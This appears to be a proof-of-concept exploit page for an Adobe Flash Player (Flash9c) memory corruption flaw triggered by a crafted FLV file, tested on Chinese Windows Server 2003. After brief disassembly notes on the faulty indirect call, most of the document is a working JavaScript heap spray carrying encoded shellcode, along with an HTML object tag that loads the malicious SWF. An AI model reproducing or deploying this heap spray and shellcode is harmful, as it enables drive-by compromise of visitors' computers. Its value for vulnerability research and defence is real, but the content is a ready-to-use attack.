test on windows server 2003 Chinese, yunshu, www.ph4nt0m.org

3019CE18    C1E9 02         SHR ECX,2 
3019CE1B    83E2 03         AND EDX,3 
3019CE1E    83F9 08         CMP ECX,8 
3019CE21    72 29           JB SHORT Flash9c.3019CE4C 
3019CE23    F3:A5           REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] 


300ED77D    85C9            TEST ECX,ECX 
300ED77F    0F84 00070000   JE Flash9c.300EDE85 
300ED785    8B01            MOV EAX,DWORD PTR DS:[ECX] 
300ED787    FF50 20         CALL DWORD PTR DS:[EAX+20] 

When use heap spray, this will change ecx,so I let this js script run heap spray first.
ALl memory is alloted,then load the flv file, and the ecx will be change to 0c0c0c0c which writen in 1.flv.
00000000-0c0c0c0c is filled by 0c0c0c0c and shellcode. so CALL DWORD PTR DS:[EAX+20] will call 0x0c0c0c0c,and 
0x0c0c0c0c 's content is 0c0c0c0c, then run the shellcode.

^_^,maybe you should do some change!

<script>
var heapSprayToAddress = 0x0c0c0c0c;

var shellcode = unescape("%u29%uc9%u83%ue9%udd%ud9%uee%ud9%u74%u24%uf4%u5b%u81%u73%u13%u9c"+
"%u26%u74%u4a%u83%ueb%ufc%ue2%uf4%u60%uce%u30%u4a%u9c%u26%uff%u0f" +
"%ua0%uad%u08%u4f%ue4%u27%u9b%uc1%ud3%u3e%uff%u15%ubc%u27%u9f%u03" +
"%u17%u12%uff%u4b%u72%u17%ub4%ud3%u30%ua2%ub4%u3e%u9b%ue7%ube%u47" +
"%u9d%ue4%u9f%ube%ua7%u72%u50%u4e%ue9%uc3%uff%u15%ub8%u27%u9f%u2c" +
"%u17%u2a%u3f%uc1%uc3%u3a%u75%ua1%u17%u3a%uff%u4b%u77%uaf%u28%u6e" +
"%u98%ue5%u45%u8a%uf8%uad%u34%u7a%u19%ue6%u0c%u46%u17%u66%u78%uc1" +
"%uec%u3a%ud9%uc1%uf4%u2e%u9f%u43%u17%ua6%uc4%u4a%u9c%u26%uff%u22" +
"%ua0%u79%u45%ubc%ufc%u70%ufd%ub2%u1f%ue6%u0f%u1a%uf4%ud6%ufe%u4e" +
"%uc3%u4e%uec%ub4%u16%u28%u23%ub5%u7b%u48%u1b%u3e%uf9%u56%u15%u2e" +
"%u9c%u26%u74%u4a");

var heapBlockSize = 0x100000;
var payLoadSize = shellcode.length * 2;
var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
var spraySlide = unescape("%u0c0c%u0c0c");

spraySlide = getSpraySlide(spraySlide,spraySlideSize);
heapBlocks = (heapSprayToAddress - 0x100000)/heapBlockSize;
memory = new Array();

for (i=0;i<heapBlocks;i++)
{
		memory[i] = spraySlide + shellcode;
}

function getSpraySlide(spraySlide, spraySlideSize)
{
	while (spraySlide.length*2<spraySlideSize)
	{
		spraySlide += spraySlide;
	}
	spraySlide = spraySlide.substring(0,spraySlideSize/2);
	return spraySlide;
}
</script>

<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" 
width="550" height="400" id="1" align="middle">
<param name="allowScriptAccess" value="sameDomain" />
<param name="movie" value="1.swf" /><param name="quality" value="high" />
<param name="bgcolor" value="#ffffff" /><embed src="1.swf" quality="high" bgcolor="#ffffff" 
width="550" height="400" name="1" align="middle" allowScriptAccess="sameDomain" 
type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
</object>